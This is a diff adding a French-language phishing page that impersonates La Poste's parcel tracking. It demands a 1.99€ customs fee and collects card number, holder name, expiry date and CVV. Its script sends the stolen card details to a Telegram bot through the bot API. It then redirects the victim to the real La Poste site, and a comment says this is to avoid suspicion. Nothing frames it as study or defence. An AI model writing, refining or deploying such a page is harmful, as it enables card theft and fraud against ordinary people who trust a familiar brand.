@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suivi de Colis - La Poste</title>
+    <!-- On utilise les vraies couleurs et polices de La Poste -->
+    <style> body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; } .container { max-width: 390px; margin: 50px auto; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 20px; } .logo { text-align: center; margin-bottom: 20px; } .logo img { height: 40px; } .title { font-size: 20px; font-weight: bold; text-align: center; margin-bottom: 10px; } .info { color: #333; text-align: center; margin-bottom: 30px; font-size: 14px; } .form-group { margin-bottom: 20px; } label { display: block; margin-bottom: 5px; font-size: 14px; color: #333; } input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; } .btn { background-color: #e2001a; color: white; padding: 12px; border: none; border-radius: 4px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; } .btn:hover { background-color: #c1000a; } </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.laposte.fr/ressources/static/images/logo-laposte-color.png" alt="La Poste">
+        </div>
+        <h2 class="title">Frais de Libération de Colis</h2>
+        <p class="info">Pour débloquer votre colis, veuillez régler les frais de douane de 1.99€.</p>
+        <form id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>
+            </div>
+            <div class="form-group">
+                <label for="card-name">Nom du titulaire</label>
+                <input type="text" id="card-name" placeholder="JEAN DUPONT" required>
+            </div>
+            <div class="form-group">
+                <label for="card-expiry">Date d'expiration</label>
+                <input type="text" id="card-expiry" placeholder="MM/AA" maxlength="5" required>
+            </div>
+            <div class="form-group">
+                <label for="card-cvv">CVV</label>
+                <input type="password" id="card-cvv" placeholder="123" maxlength="4" required>
+            </div>
+            <button type="submit" class="btn">Payer 1.99€</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Empêche la soumission du formulaire
+
+            const cardNumber = document.getElementById('card-number').value;
+            const cardName = document.getElementById('card-name').value;
+            const cardExpiry = document.getElementById('card-expiry').value;
+            const cardCvv = document.getElementById('card-cvv').value;
+
+            // Construire le message pour le bot Telegram
+            const message = `🇫🇷 NOUVELLE CARTE - COLISSIMO 🇫🇷\n\nNom: ${cardName}\nNumero: ${cardNumber}\nExp: ${cardExpiry}\nCVV: ${cardCvv}`;
+            
+            // Remplacer par tes vraies infos de bot
+            const botToken = '8637191887:AAGHxgOdZy36sVRgsQcvISDSwLBhLCdkgkM';
+            const chatId = '8463869498';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Envoyer les données au bot Telegram
+            fetch(telegramUrl).then(response => {
+                // Une fois les données envoyées, rediriger vers le vrai site de La Poste
+                // pour ne pas éveiller les soupçons
+                window.location.href = 'https://www.laposte.fr/outils/suivre-vos-envois';
+            }).catch(error => {
+                // En cas d'erreur, rediriger quand même
+                window.location.href = 'https://www.laposte.fr/outils/suivre-vos-envois';
+            });
+        });
+    </script>
+</body>
+</html>
